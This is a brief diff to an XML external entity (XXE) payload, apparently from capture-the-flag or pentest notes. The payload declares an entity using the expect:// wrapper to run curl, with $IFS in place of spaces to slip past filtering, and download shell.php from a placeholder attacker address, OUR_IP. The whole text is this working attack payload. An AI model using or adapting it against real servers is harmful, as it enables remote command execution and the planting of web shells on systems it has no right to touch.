@@ -4,6 +4,6 @@
 <!-- Then send the request -->
 <?xml version="1.0"?>
 <!DOCTYPE email [
-  <!ENTITY xxx SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+  <!ENTITY xxx SYSTEM "expect://curl$IFS-O$IFS'http://OUR_IP/shell.php'">
 ]>
 <root>&xxx;</root>
